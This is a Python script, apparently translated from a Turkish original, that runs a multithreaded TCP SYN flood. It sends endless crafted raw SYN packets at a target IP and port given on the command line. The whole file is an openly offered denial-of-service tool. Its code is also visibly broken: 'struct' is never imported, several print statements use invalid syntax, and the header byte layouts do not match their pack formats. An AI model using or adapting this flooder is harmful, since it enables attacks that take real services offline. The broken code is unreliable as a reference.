import socket
import sys
import threading
import time

# ANSI color codes for colored output
KRMZ = '\x1B[31m'
YSL = '\x1B[32m'
SR = '\x1B[33m'
MV = '\x1B[34m'
RESET = '\x1B[0m'

# Global variable definitions.
p_num = 0
mut = threading.Lock()
start_time = None

def csum(data):
    n = len(data)
    sum_ = 0
    for i in range(0, n, 2):
        if i + 1 < n:
            sum_ += (data[i] + (data[i + 1] << 8))
        elif i + 1 == n:
            sum_ += data[i]
    while (sum_ >> 16) > 0:
        sum_ = (sum_ & 0xFFFF) + (sum_ >> 16)
    sum_ = ~sum_
    return sum_ & 0xFFFF

def bilgi():
    global p_num, start_time
    time_diff = time.time() - start_time
    print("\n\n----------------------------------------------------------")
    print(f"\n\nNumber of PACKETS: {YSL}{p_num}{RESET} \t Attack Time: {YSL}{time_diff:.2f}{RESET} second\n\n")
    print("----------------------------------------------------------\n\n")
    sys.exit(1)

def attack(target_ip, target_port):
    global p_num
    while True:
        try:
            # Create a raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Craft IP header
            iph = b'\x45\x00\x00\x34'  # IP header with pre-calculated checksum, length=0x34 (52 bytes)
            iph += b'\x00\x00\x40\x00'  # ID, Flags, Fragment Offset
            iph += b'\xFF\x06\x00\x00'  # TTL=255, Protocol=TCP, Checksum=0 (will calculate later)
            iph += b'\x00\x00\x00\x00'  # Source IP address (will be set later)
            iph += socket.inet_aton(target_ip)  # Destination IP address

            # Craft TCP header
            tcph = b'\x00\x00\x00\x00'  # Source Port (will be set later)
            tcph += socket.htons(target_port).to_bytes(2, 'big')  # Destination Port
            tcph += b'\x00\x00\x00\x00'  # Sequence Number
            tcph += b'\x00\x00\x00\x00'  # Acknowledgment Number
            tcph += b'\x50\x02\x71\x10'  # TCP Flags (SYN)
            tcph += b'\xFF\xFF\x00\x00'  # Window Size
            tcph += b'\x00\x00\x00\x00'  # TCP Checksum (will calculate later)
            tcph += b'\x00\x00\x00\x00'  # Urgent Pointer

            # Assemble the pseudo-header to calculate TCP checksum
            source_address = socket.inet_aton(target_ip)
            dest_address = socket.inet_aton(target_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcph)
            psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
            psh += tcph

            tcph = struct.pack('!HHLLBBHHH', *struct.unpack('!HHLLBBHHH', tcph))
            tcph = tcph[:16] + struct.pack('H', csum(psh)) + tcph[18:]

            # Assemble the IP header with correct checksum and source address
            iph = struct.pack('!BBHHHBBH4s4s', *struct.unpack('!BBHHHBBH4s4s', iph))
            source_address = socket.inet_aton('YOUR_SOURCE_IP')  # Replace with your own source IP address
            iph = iph[:12] + struct.pack('!4s', source_address) + iph[16:]

            # Combine IP header and TCP header to create the datagram
            datagram = iph + tcph

            # Send the packet
            s.sendto(datagram, (target_ip, 0))
            s.close()

            # Update the packet count in the critical section
            with mut:
                p_num += 1
                if p_num == 1:
                    print(YSL"[+]"MV" Attack has been started!"RESET)

        except:
            pass

def main():
    if len(sys.argv) != 5:
        print(SR"[!]"RESET" Please enter the commands correctly\n")
        print(YSL"USAGE:"RESET"  python3 {} <source port> <target> <target port> <threads number>\n".format(sys.argv[0]))
        sys.exit(0)

    # Extract command-line arguments
    source_port = int(sys.argv[1])
    target = sys.argv[2]
    target_port = int(sys.argv[3])
    num_threads = int(sys.argv[4])

    global start_time
    start_time = time.time()  # Start timer

    # DNS resolution to get target IP address if the input is a domain name
    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror as e:
        print(KRMZ"[-]"RESET" DNS resolution failed for target: {}\n".format(target))
        sys.exit(0)

    # Create threads for the attack
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(target_ip, target_port))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
